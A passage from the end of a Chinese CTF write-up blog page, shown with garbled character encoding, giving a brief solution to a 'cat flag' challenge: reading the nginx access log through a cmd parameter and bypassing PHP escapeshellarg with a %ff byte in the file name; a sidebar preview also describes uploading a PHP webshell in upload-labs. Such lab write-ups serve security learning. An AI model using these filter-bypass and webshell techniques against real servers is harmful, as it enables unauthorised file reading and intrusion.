<p>ç›¸å½“äºä¸€ä¸ªæ–‡ä»¶ä»»æ„è¯»å–</p>
<img src="/2025/07/10/buu%E5%88%B7%E9%A2%98/image-20250709151517513.png" class="" title="image-20250709151517513">

<h1 id="WesternCTF2018-shrine"><a href="#WesternCTF2018-shrine" class="headerlink" title="[WesternCTF2018]shrine"></a>[WesternCTF2018]shrine</h1><h1 id="2021DASCTFå®æˆ˜ç²¾è‹±å¤ä»¤è¥æš¨DASCTF-July-X-CBCTF-4th-cat-flag"><a href="#2021DASCTFå®æˆ˜ç²¾è‹±å¤ä»¤è¥æš¨DASCTF-July-X-CBCTF-4th-cat-flag" class="headerlink" title="[2021DASCTFå®æˆ˜ç²¾è‹±å¤ä»¤è¥æš¨DASCTF July X CBCTF 4th]cat flag"></a>[2021DASCTFå®æˆ˜ç²¾è‹±å¤ä»¤è¥æš¨DASCTF July X CBCTF 4th]cat flag</h1><p>æ ¹æ®æç¤ºç®¡ç†å‘˜è®¿é—®è¿‡flagé‚£å°±å¯»æ‰¾æ—¥å¿—æ–‡ä»¶</p>
<p>?<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=cmd&spm=1001.2101.3001.7020">cmd</a>&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</p>
<p>å‘å…ˆflagæ–‡ä»¶ä½†æ˜¯æœ‰è¿‡æ»¤</p>
<p>ç„¶åå°±æ˜¯æƒ³åŠæ³•ç»•è¿‡escapeshellarg</p>
<p>ç”±äºescapeshellargå¹¶ä¸ä¼šæ£€æµ‹æˆ–ç§»é™¤â€œä¸å¯è§å­—ç¬¦â€æ‰€ä»¥ä½¿ç”¨ä»¥ä¸‹payloadå³å¯</p>
<p>?cmd&#x3D;this_is_final_fl%ffag_e2a457126032b42d.php</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>æ–‡ç« ä½œè€…: </span><span class="post-copyright-info"><a href="https://www.zmrz.xyz">ZmRz</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>æ–‡ç« é“¾æ¥: </span><span class="post-copyright-info"><a href="https://www.zmrz.xyz/2025/07/10/buu%E5%88%B7%E9%A2%98/">https://www.zmrz.xyz/2025/07/10/buu%E5%88%B7%E9%A2%98/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>ç‰ˆæƒå£°æ˜: </span><span class="post-copyright-info">æœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜æ¥æº <a href="https://www.zmrz.xyz" target="_blank">ZmRzã®blog</a>ï¼</span></div></div><div class="tag_share"><div class="post-share"><div class="social-share" data-image="/images/covers/%E3%80%90%E5%93%B2%E9%A3%8E%E5%A3%81%E7%BA%B8%E3%80%91%E5%89%91-%E5%8F%A4%E9%A3%8E-%E5%BE%A1%E5%89%91%E9%A9%AD%E9%BE%99.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2025/03/13/upload-labs/" title="upload-labs"><img class="cover" src="/images/covers/%E3%80%90%E5%93%B2%E9%A3%8E%E5%A3%81%E7%BA%B8%E3%80%91%E5%8A%A8%E6%BC%AB%E5%A5%B3%E5%AD%A9-%E5%8F%AF%E7%88%B1.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">ä¸‹ä¸€ç¯‡</div><div class="info-item-2">upload-labs</div></div><div class="info-2"><div class="info-item-1">upload-labsé¶åœºï¼ˆç”±äºç‰ˆæœ¬çš„é—®é¢˜è¯¥é¶åœºè¦ä½¿ç”¨php5ç­‰åç¼€åä¸èƒ½ä½¿ç”¨ntsç‰ˆçš„phpæœ€ç®€å•æ–¹æ³•ä½¿ç”¨è€ç‰ˆæœ¬phpstudyï¼Œç¬¬åäºŒå’Œç¬¬åä¸‰å…³çš„phpç‰ˆæœ¬è¦æ±‚åœ¨5.3ä»¥ä¸‹ä¸”magic_quotes_gpcä¸ºå…³é—­çŠ¶æ€ï¼ˆéœ€è¦è‡ªå·±å…³é—­ï¼‰ï¼‰ ç¬¬ä¸€å…³ç¬¬ä¸€å…³ä¸­ç›´æ¥ä¸Šä¼ phpæ–‡ä»¶å‘ç°å…¶åªèƒ½ä¸Šä¼ jpg png gifè¿™ç§å›¾ç‰‡æ–‡ä»¶ å¹¶å‘ç°åœ¨ä¸Šä¼ æ“ä½œæ—¶æ— æ³•å¯¹å…¶è¿›è¡ŒæŠ“åŒ…æ‰€ä»¥ç¡®å®šå…¶ä¸ºå‰ç«¯éªŒè¯   å°†ä¸€å¥è¯æœ¨é©¬æ–‡ä»¶åç¼€æ”¹ä¸ºjpgè¿›è¡Œä¸Šä¼ å¹¶è¿›è¡ŒæŠ“åŒ…å¤„ç†   ä½¿ç”¨bpæŠ“åŒ…å¹¶å°†æ–‡ä»¶åç¼€æ”¹ä¸ºphpåå‘ç°æˆåŠŸä¸Šä¼ æ–‡ä»¶ ä½¿ç”¨èšå‰‘è¿›è¡Œè¿æ¥ï¼ŒæˆåŠŸè¿æ¥æœ¨é©¬   ç¬¬äºŒå…³ç¬¬äºŒå…³å‘ç°å…¶å¹¶ä¸æ˜¯å‰ç«¯éªŒè¯   ä½†ç›´æ¥bpæŠ“åŒ…ä¿®æ”¹åç¼€åå³å¯æˆåŠŸä¸Šä¼ æœ¨é©¬ï¼Œä¹‹åä½¿ç”¨èšå‰‘è¿æ¥å³å¯ ç¬¬ä¸‰å…³ä¸Šä¼ phpæ–‡ä»¶åå‘ç°å…¶è®¾ç½®äº†é»‘åå•   ä¸å…è®¸ä¸Šä¼ phpæ–‡ä»¶ï¼Œæ•…æŠ“åŒ…å°†phpæ–‡ä»¶åç¼€æ”¹ä¸ºphp5è¿›è¡Œå°è¯• è¿›è¡Œå¤šæ¬¡å°è¯•å‘ç°æ–°ç‰ˆphpstudyé»˜è®¤ä¸‹è½½çš„phpç‰ˆæœ¬æœ‰é—®é¢˜æ•…è€Œå°†ç‰ˆæœ¬é€€å›2016è¿›è¡Œå°è¯•å®éªŒæˆåŠŸï¼ŒåŸå› æ˜¯å› ä¸ºæ–°ç‰ˆphpstudyä¸‹è½½çš„phpç‰ˆæœ¬å‡ä¸ºntsç‰ˆé…ç½®æ–‡ä»¶ä¸­æ— æ³•æ›´æ”¹è¯†åˆ«å†…å®¹æ•…å°†å…¶é€€å›2016ç‰ˆæœ¬å³å¯ è¯¦ç»†å†…å®¹å‚è€ƒè¯¥æ–‡ç« å…³äºPHPStud...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/images/avatar.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">ZmRz</div><div class="author-info-description">æ€»æœ‰äººé—´ä¸€ä¸¤é£,å¡«æˆ‘åä¸‡å…«åƒæ¢¦</div><div class="site-data"><a href="/archives/"><div class="headline">æ–‡ç« </div><div class="length-num">4</div></a><a href="/tags/"><div class="headline">æ ‡ç­¾</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">åˆ†ç±»</div><div class="length-num">3</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>ç›®å½•</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-UnserializeOne"><span class="toc-number">1.</span> <span class="toc-text">[NewStarCTF å…¬å¼€èµ›èµ›é“]UnserializeOne</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#NewStarCTF-2023-%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-R-C-E"><span class="toc-number">2.</span> <span class="toc-text">[NewStarCTF 2023 å…¬å¼€èµ›é“]R!C!E!</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#NewStarCTF-2023-%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-EasyLogin"><span class="toc-number">3.</span> <span class="toc-text">[NewStarCTF 2023 å…¬å¼€èµ›é“]EasyLogin</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#NewStarCTF-2023-%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-Begin-of-HTTP"><span class="toc-number">4.</span> <span class="toc-text">[NewStarCTF 2023 å…¬å¼€èµ›é“]Begin of HTTP</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#NewStarCTF-2023-%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-Begin-of-Upload"><span class="toc-number">5.</span> <span class="toc-text">[NewStarCTF 2023 å…¬å¼€èµ›é“]Begin of Upload</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">5.0.1.</span> <span class="toc-text"></span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#NewStarCTF-2023-%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-Begin-of-PHP"><span class="toc-number">6.</span> <span class="toc-text">[NewStarCTF 2023 å…¬å¼€èµ›é“]Begin of PHP</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#NewStarCTF-2023-%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-%E6%B3%84%E6%BC%8F%E7%9A%84%E7%A7%98%E5%AF%86"><span class="toc-number">7.</span> <span class="toc-text">[NewStarCTF 2023 å…¬å¼€èµ›é“]æ³„æ¼çš„ç§˜å¯†</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#NewStarCTF-2023-%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-ez-sql"><span class="toc-number">8.</span> <span class="toc-text">[NewStarCTF 2023 å…¬å¼€èµ›é“]ez_sql</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#NewStarCTF-2023-%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-Upload-again"><span class="toc-number">9.</span> <span class="toc-text">[NewStarCTF 2023 å…¬å¼€èµ›é“]Upload again!</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#NewStarCTF-2023-%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-%E6%B8%B8%E6%88%8F%E9%AB%98%E6%89%8B"><span class="toc-number">10.</span> <span class="toc-text">[NewStarCTF 2023 å…¬å¼€èµ›é“]æ¸¸æˆé«˜æ‰‹</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#NewStarCTF-2023-%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-Include-%F0%9F%8D%90"><span class="toc-number">11.</span> <span class="toc-text">[NewStarCTF 2023 å…¬å¼€èµ›é“]Include ğŸ</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#NewStarCTF-2023-%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-R-C-E-1"><span class="toc-number">12.</span> <span class="toc-text">[NewStarCTF 2023 å…¬å¼€èµ›é“]R!!C!!E!!</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#NewStarCTF-2023-%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-Unserialize%EF%BC%9F"><span class="toc-number">13.</span> <span class="toc-text">[NewStarCTF 2023 å…¬å¼€èµ›é“]Unserializeï¼Ÿ</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#NewStarCTF-2023-%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-R-C-E-2"><span class="toc-number">14.</span> <span class="toc-text">[NewStarCTF 2023 å…¬å¼€èµ›é“]R!!!C!!!E!!!</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#NewStarCTF-2023-%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-POP-Gadget"><span class="toc-number">15.</span> <span class="toc-text">[NewStarCTF 2023 å…¬å¼€èµ›é“]POP Gadget</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#NewStarCTF-2023-%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-More-Fast"><span class="toc-number">16.</span> <span class="toc-text">[NewStarCTF 2023 å…¬å¼€èµ›é“]More Fast</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#NewStarCTF-2023-%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-%E9%80%83"><span class="toc-number">17.</span> <span class="toc-text">[NewStarCTF 2023 å…¬å¼€èµ›é“]é€ƒ</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#NCTF2019-Fake-XML-cookbook"><span class="toc-number">18.</span> <span class="toc-text">[NCTF2019]Fake XML cookbook</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#BJDCTF2020-Cookie-is-so-stable"><span class="toc-number">19.</span> <span class="toc-text">[BJDCTF2020]Cookie is so stable</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#VNCTF2023-%E8%B1%A1%E6%A3%8B%E7%8E%8B%E5%AD%90%E3%80%81"><span class="toc-number">20.</span> <span class="toc-text">[VNCTF2023]è±¡æ£‹ç‹å­ã€</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E6%9C%B1%E9%9B%80%E7%BB%84-Nmap"><span class="toc-number">21.</span> <span class="toc-text">[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]Nmap</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#RoarCTF-2019-Easy-Java"><span class="toc-number">22.</span> <span class="toc-text">[RoarCTF 2019]Easy Java</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#WesternCTF2018-shrine"><span class="toc-number">23.</span> <span class="toc-text">[WesternCTF2018]shrine</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2021DASCTF%E5%AE%9E%E6%88%98%E7%B2%BE%E8%8B%B1%E5%A4%8F%E4%BB%A4%E8%90%A5%E6%9A%A8DASCTF-July-X-CBCTF-4th-cat-flag"><span class="toc-number">24.</span> <span class="toc-text">[2021DASCTFå®æˆ˜ç²¾è‹±å¤ä»¤è¥æš¨DASCTF July X CBCTF 4th]cat flag</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>æœ€æ–°æ–‡ç« </span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2025/07/10/buu%E5%88%B7%E9%A2%98/" title="buuåˆ·é¢˜"><img src="/images/covers/%E3%80%90%E5%93%B2%E9%A3%8E%E5%A3%81%E7%BA%B8%E3%80%91%E5%89%91-%E5%8F%A4%E9%A3%8E-%E5%BE%A1%E5%89%91%E9%A9%AD%E9%BE%99.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="buuåˆ·é¢˜"/></a><div class="content"><a class="title" href="/2025/07/10/buu%E5%88%B7%E9%A2%98/" title="buuåˆ·é¢˜">buuåˆ·é¢˜</a><time datetime="2025-07-10T11:51:44.000Z" title="å‘è¡¨äº 2025-07-10 19:51:44">2025-07-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/03/13/upload-labs/" title="upload-labs"><img src="/images/covers/%E3%80%90%E5%93%B2%E9%A3%8E%E5%A3%81%E7%BA%B8%E3%80%91%E5%8A%A8%E6%BC%AB%E5%A5%B3%E5%AD%A9-%E5%8F%AF%E7%88%B1.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="upload-labs"/></a><div class="content"><a class="title" href="/2025/03/13/upload-labs/" title="upload-labs">upload-labs</a><time datetime="2025-03-13T01:19:54.000Z" title="å‘è¡¨äº 2025-03-13 09:19:54">2025-03-13</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/03/12/upload%E7%9F%A5%E8%AF%86%E7%82%B9/" title="uploadçŸ¥è¯†ç‚¹"><img src="/images/covers/090950gnrvQ.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="uploadçŸ¥è¯†ç‚¹"/></a><div class="content"><a class="title" href="/2025/03/12/upload%E7%9F%A5%E8%AF%86%E7%82%B9/" title="uploadçŸ¥è¯†ç‚¹">uploadçŸ¥è¯†ç‚¹</a><time datetime="2025-03-12T13:03:35.000Z" title="å‘è¡¨äº 2025-03-12 21:03:35">2025-03-12</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/11/11/sql%E6%B3%A8%E5%85%A5/" title="sqlæ³¨å…¥"><img src="/images/covers/082813gxSbT.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="sqlæ³¨å…¥"/></a><div class="content"><a class="title" href="/2024/11/11/sql%E6%B3%A8%E5%85%A5/" title="sqlæ³¨å…¥">sqlæ³¨å…¥</a><time datetime="2024-11-10T16:44:06.000Z" title="å‘è¡¨äº 2024-11-11 00:44:06">2024-11-11</time></div></div></div></div></div></div></main><footer id="footer"></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="é˜…è¯»æ¨¡å¼"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="æ—¥é—´å’Œå¤œé—´æ¨¡å¼åˆ‡æ¢"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="å•æ å’ŒåŒæ åˆ‡æ¢"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="è®¾ç½®"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="ç›®å½•"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="å›åˆ°é¡¶éƒ¨"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script src="/js/fish.js"></script><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>